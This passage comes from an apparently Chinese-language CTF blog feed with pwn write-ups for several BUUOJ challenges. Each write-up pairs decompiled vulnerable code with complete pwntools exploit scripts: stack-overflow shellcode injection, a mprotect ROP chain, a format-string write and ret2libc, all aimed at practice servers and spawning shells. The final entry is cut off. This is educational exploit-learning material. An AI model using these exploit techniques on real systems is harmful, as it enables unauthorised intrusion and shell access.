<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  header();</span><br><span class="line">  chall();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);    <span class="comment">//栈地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);                        <span class="comment">// 输入到s </span></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="number">10</span>, v0);      </span><br><span class="line">  <span class="comment">//C 库函数 void *memchr(const void *str, int c, size_t n) 在参数 str 所指向的字符串的前 n 个字节中搜索第一次出现字符 c（一个无符号字符）的位置。   这里的10就是指换行符</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( v3 )         <span class="comment">//没有作用</span></span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = (<span class="type">void</span> *)<span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);    <span class="comment">//strcmp以0x00结尾，认为0x00就是字符串结束了，不会再对后面的继续做判断</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )       <span class="comment">//要求strcmp的比较结果为0，也就是相等</span></span><br><span class="line">    result = vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);    <span class="comment">//调用vuln，限制的长度为0x400</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">int</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);              <span class="comment">// 可以溢出，memcpy不是以0x00结尾的，而是看n的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路：可以构造一个shellcode，然后通过输入s写到栈上，在vuln的溢出时把ret地址覆盖，返回到shellcode的起始地址。</p>
<p>要成功执行我们的shellcode必须要知道shellcode的位置，而chall函数在执行时就把s缓冲区的地址告诉了我们，因此，只要知道了s缓冲区和shellcode地址的相对偏移量，那么我们每次都可以得到shellcode的地址<br>那通过脚本调试先确定好执行到覆盖栈的偏移量</p>
<p>测试payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)<span class="comment">#接收回显的参数s在栈上的地址，长度是10，以16进制表示</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span class="comment">#后面的aaaa是测试数据，随便输入的，我们等等去栈上找它的地址</span></span><br><span class="line">      <span class="comment">#利用它找到返回地址在栈上的地址，将返回地址覆盖为shellcode</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()<span class="comment">#linxu下的暂停程序命令</span></span><br></pre></td></tr></table></figure>

<p>断点0x8048600就是在memcpy复制完之后，这样就能知道溢出的长度为多少</p>
<p><img src="/ez_pz_hackover_2016/2.jpg"></p>
<p>经过调试，可以知道，溢出的长度为18.</p>
<p><img src="/ez_pz_hackover_2016/3.jpg"></p>
<p>需要让程序返回到shellcode的起始地址，则需要对地址进行计算，对构造的payload进行理解</p>
<p>‘crashme\x00’+’aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa’</p>
<p>这是我们在测试时候构造的payload，其中让他转会为shellcode</p>
<p>‘crashme\x00后的18个字母是填充字母，无所谓（包含了ebp了），其后的4个字母是ret地址，要填写shellcode地址。</p>
<p>最后的部位填写shellcode，也就是从aaga的部分开始，我们一开始得到了一个地址，search ‘aaga’得到该字符串的栈地址，通过该地址计算偏移，得到0x1c。</p>
<p><img src="/ez_pz_hackover_2016/4.jpg"></p>
<p>因此最终的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&#x27;node4.buuoj.cn&#x27;,27872)</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">#context(os=&#x27;linux&#x27;, arch=&#x27;i386&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;crash&#x27;)</span><br><span class="line">p.recv(2)</span><br><span class="line">stack_addr = int(p.recv(10),16)</span><br><span class="line">print(&#x27;stack_addr:&#x27; + hex(stack_addr))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = &#x27;crashme\x00&#x27; + &#x27;a&#x27;*18 + p32(stack_addr-0x1c) + shellcode</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>get_started_3dsctf_2016</title>
    <url>/get_started_3dsctf_2016/</url>
    <content><![CDATA[<h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p><a href="https://blog.csdn.net/Nashi_Ko/article/details/109528155">https://blog.csdn.net/Nashi_Ko/article/details/109528155</a></p>
<p>使用checksec查看，得到如下结果，只开了栈执行权限保护。</p>
<p><img src="/get_started_3dsctf_2016/get_started_3dsctf_2016(1).png"></p>
<p>使用ida查看，发现如下代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF      //没有ebp，距离ret的地址为0x38</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);                             <span class="comment">//存在溢出点，回车为结尾</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span>   <span class="comment">//执行该函数即可获取到flag，该函数没有push ebp</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">​    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">​    v3 = getc(v2);</span><br><span class="line">​    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">​    &#123;</span><br><span class="line">​      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">​      <span class="keyword">do</span></span><br><span class="line">​      &#123;</span><br><span class="line">​        <span class="built_in">putchar</span>(v4);</span><br><span class="line">​        v5 = getc(v2);</span><br><span class="line">​        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">​      &#125;</span><br><span class="line">​      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">​    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据代码，整理基本的思路，通过在main函数中溢出，覆盖ret地址，跳转到get_flag函数，为了能让程序正常回显，在执行完get_flag后需要跳转到exit函数。</p>
<p>构造payload脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;local:1/remote:2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">select = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> select == <span class="number">1</span>:</span><br><span class="line">​    p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> select == <span class="number">2</span>:</span><br><span class="line">​    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29839</span>)</span><br><span class="line"></span><br><span class="line">get_flag_func_addr = <span class="number">0x080489A0</span></span><br><span class="line">get_flag_line_addr = <span class="number">0x080489B8</span></span><br><span class="line">exit_addr = <span class="number">0x0804E6A0</span>     <span class="comment">#程序需要正常退出才能输出结果，因此执行完getflag后就exit</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">56</span> + p32(get_flag_func_addr) + p32(exit_addr) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#payload2 = &#x27;a&#x27;*56 + p32(get_flag_line_addr) + p32(exit_addr) 直接跳转到getflag那一行代码的，本地跑的通,远程跑不通</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#sleep(0.1)</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#p.recv()</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recv())</span><br></pre></td></tr></table></figure>

<p>还有一种方式，就是使用mprotect函数，这个函数可以改变程序内存空间的读写执行权限。</p>
<p><a href="https://www.cnblogs.com/lyxf/p/12113401.html">https://www.cnblogs.com/lyxf/p/12113401.html</a></p>
<p>先用mprotect函数把.bss中的一部分改为可执行，用调用read函数向其中写入shellcode，最后再跳转到shellcode出执行。</p>
<p>int mprotect(const void *start, size_t len, int prot);</p>
<p>参数start表示开始的内存地址，len是要操作的内存大小，prot表示权限，当这个值为7的时候表示可读可写可执行，类似linux的权限管理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29839)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  </span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eb000</span>        <span class="comment">#这是一段可以读写的段</span></span><br><span class="line"></span><br><span class="line">pop_ebx_esi_edi_ret=<span class="number">0x080509a5</span>    <span class="comment">#为了堆栈平衡，其实就是让pop出所以ret地址之前的所有内容</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span> + p32(elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop_ebx_esi_edi_ret) + p32(bss) + p32(<span class="number">0x2c</span>) + p32(<span class="number">7</span>)   <span class="comment">#先执行mprotect把bss指向的地址修改为rwx权限</span></span><br><span class="line"></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>]) + p32(bss) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x2c</span>)     <span class="comment">#调用read函数，将键盘输入输入到bss所在的位置，完成后ret返回到bss，执行shellcode</span></span><br><span class="line"></span><br><span class="line">\<span class="comment">#payload += p32(elf.symbols[&#x27;read&#x27;]) + p32(pop_ebx_esi_edi_ret) + p32(0) + p32(bss) + p32(0x2c) + p32(bss)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload=asm(shellcraft.sh())   <span class="comment">#生成shellcode</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>shellcode</tag>
        <tag>跳转到指定函数</tag>
        <tag>mprotect修改权限</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_fm</title>
    <url>/jarvisoj_fm/</url>
    <content><![CDATA[<h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>格式化字符串漏洞</p>
<p><a href="https://blog.csdn.net/qq_43394612/article/details/84900668">https://blog.csdn.net/qq_43394612/article/details/84900668</a></p>
<p><img src="/jarvisoj_fm/1.jpg"></p>
<p>使用checksec查看，发现屏蔽栈溢出，使用IDA查看重要代码以及字符串，发现了system函数以及&#x2F;bin&#x2F;sh字符串</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);    <span class="comment">//printf的内容是由自己来操作，因此可以进行字符串格式化。</span></span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )    <span class="comment">//当x=4的时候，可以执行shell</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>为了写入到x的位置，因此要先找到x的地址，在0x0804A02C，长度为3个字节，注意</p>
<p><img src="/jarvisoj_fm/2.jpg"></p>
<p>输入AAAA %08x %08x %8x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x 确认字符串地址所在位置，这个%x是从esp地址开始算的（包括esp），由0开始。这里是从AAAA开始，由0开始数，第11个参数</p>
<p><img src="/jarvisoj_fm/3.jpg"></p>
<p>构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">x_addr=<span class="number">0x0804a02c</span></span><br><span class="line">payload=p32(x_addr)+<span class="string">&#x27;%11$n&#x27;</span> <span class="comment">#这里写入地址的值为4的原因是%11$的长度为4，如果设置为aaaa%11$n，那么长度就为8  </span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#print p.recv()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>32bit</tag>
        <tag>格式化字符串漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>jarvisoj_level4</title>
    <url>/jarvisoj_level4/</url>
    <content><![CDATA[<h2 id="jarvisoj-level4"><a href="#jarvisoj-level4" class="headerlink" title="jarvisoj_level4"></a>jarvisoj_level4</h2><p><img src="/jarvisoj_level4/1.jpg"></p>
<p>文件为32位，不可以shellcode。</p>
<p>使用ida查看重要函数，查看字符串没有发现’&#x2F;bin&#x2F;sh’。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);    <span class="comment">//存在溢出点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>构造lib，暴露read的地址。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27490</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x8c</span> + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>ret2libc</tag>
        <tag>32bit</tag>
      </tags>
  </entry>
  <entry>
    <title>mrctf2020_shellcode</title>
    <url>/mrctf2020_shellcode%20/</url>
    <content><![CDATA[<h2 id="mrctf2020-shellcode"><a href="#mrctf2020-shellcode" class="headerlink" title="mrctf2020_shellcode"></a>mrctf2020_shellcode</h2><p><img src="/mrctf2020_shellcode/1.jpg"></p>
<p>查看ida，发现main函数无法反编译，查看main函数的汇编代码，发现是一个shellcode执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000001155</span>     main            proc near               ; DATA XREF: _start+<span class="number">1</span>D↑o</span><br><span class="line">.text:<span class="number">0000000000001155</span></span><br><span class="line">.text:<span class="number">0000000000001155</span>     buf             = byte ptr <span class="number">-410</span>h</span><br><span class="line">.text:<span class="number">0000000000001155</span>     var_4           = dword ptr <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0000000000001155</span></span><br><span class="line">.text:<span class="number">0000000000001155</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000001155</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000001156</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000001159</span> <span class="number">008</span>                 sub     rsp, <span class="number">410</span>h</span><br><span class="line">.text:<span class="number">0000000000001160</span> <span class="number">418</span>                 mov     rax, cs:<span class="built_in">stdin</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">0000000000001167</span> <span class="number">418</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">000000000000116</span>C <span class="number">418</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">000000000000116F</span> <span class="number">418</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">0000000000001174</span> <span class="number">418</span>                 mov     rax, cs:<span class="built_in">stdout</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">000000000000117B</span> <span class="number">418</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">0000000000001180</span> <span class="number">418</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">0000000000001183</span> <span class="number">418</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">0000000000001188</span> <span class="number">418</span>                 mov     rax, cs:<span class="built_in">stderr</span>@@GLIBC_2_2_5</span><br><span class="line">.text:<span class="number">000000000000118F</span> <span class="number">418</span>                 mov     esi, <span class="number">0</span>          ; buf</span><br><span class="line">.text:<span class="number">0000000000001194</span> <span class="number">418</span>                 mov     rdi, rax        ; stream</span><br><span class="line">.text:<span class="number">0000000000001197</span> <span class="number">418</span>                 call    _setbuf</span><br><span class="line">.text:<span class="number">000000000000119</span>C <span class="number">418</span>                 lea     rdi, s          ; <span class="string">&quot;Show me your magic!&quot;</span></span><br><span class="line">.text:<span class="number">00000000000011</span>A3 <span class="number">418</span>                 call    _puts</span><br><span class="line">.text:<span class="number">00000000000011</span>A8 <span class="number">418</span>                 lea     rax, [rbp+buf]     </span><br><span class="line">.text:<span class="number">00000000000011</span>AF <span class="number">418</span>                 mov     edx, <span class="number">400</span>h       ; nbytes</span><br><span class="line">.text:<span class="number">00000000000011B</span>4 <span class="number">418</span>                 mov     rsi, rax        ; buf</span><br><span class="line">.text:<span class="number">00000000000011B</span>7 <span class="number">418</span>                 mov     edi, <span class="number">0</span>          ; fd</span><br><span class="line">.text:<span class="number">00000000000011B</span>C <span class="number">418</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>C1 <span class="number">418</span>                 call    _read      ;读<span class="number">400</span>长度的内容到栈上</span><br><span class="line">.text:<span class="number">00000000000011</span>C6 <span class="number">418</span>                 mov     [rbp+var_4], eax</span><br><span class="line">.text:<span class="number">00000000000011</span>C9 <span class="number">418</span>                 cmp     [rbp+var_4], <span class="number">0</span>     判断读入的长度，read的返回值返回到eax中</span><br><span class="line">.text:<span class="number">00000000000011</span>CD <span class="number">418</span>                 jg      <span class="type">short</span> loc_11D6</span><br><span class="line">.text:<span class="number">00000000000011</span>CF <span class="number">418</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000000011</span>D4 <span class="number">418</span>                 jmp     <span class="type">short</span> locret_11E4</span><br><span class="line">.text:<span class="number">00000000000011</span>D6     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000000011</span>D6</span><br><span class="line">.text:<span class="number">00000000000011</span>D6     loc_11D6:                               ; CODE XREF: main+<span class="number">78</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011</span>D6 <span class="number">418</span>                 lea     rax, [rbp+buf]</span><br><span class="line">.text:<span class="number">00000000000011</span>DD <span class="number">418</span>                 call    rax         ;指向栈上的内容，也就是shellcode，有栈执行权限</span><br><span class="line">.text:<span class="number">00000000000011</span>DF <span class="number">418</span>                 mov     eax, <span class="number">0</span> </span><br><span class="line">.text:<span class="number">00000000000011E4</span></span><br><span class="line">.text:<span class="number">00000000000011E4</span>     locret_11E4:                            ; CODE XREF: main+<span class="number">7F</span>↑j</span><br><span class="line">.text:<span class="number">00000000000011E4</span> <span class="number">418</span>                 leave</span><br><span class="line">.text:<span class="number">00000000000011E5</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000000011E5</span>     ; &#125; <span class="comment">// starts at 1155</span></span><br><span class="line">.text:<span class="number">00000000000011E5</span>     main            endp</span><br></pre></td></tr></table></figure>

<p>因此写入shellcode即可getshell，payload如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26825</span>)</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>64bit</tag>
        <tag>shellcode</tag>
      </tags>
  </entry>
  <entry>
    <title>not_the_same_3dsctf_2016</title>
    <url>/not_the_same_3dsctf_2016/</url>
    <content><![CDATA[<h1 id="not-the-same-3dsctf-2016"><a href="#not-the-same-3dsctf-2016" class="headerlink" title="not_the_same_3dsctf_2016"></a>not_the_same_3dsctf_2016</h1><p>使用checksec查看，得到如下信息，可以栈溢出，但不可以shellcode。</p>
<p><img src="/not_the_same_3dsctf_2016/not_the_same_3dsctf_2016(1).png"></p>
<p>使用ida查看，发现字符串flag.txt，发现函数get_secret和mprotect</p>
<p>相关代码如下： </p>
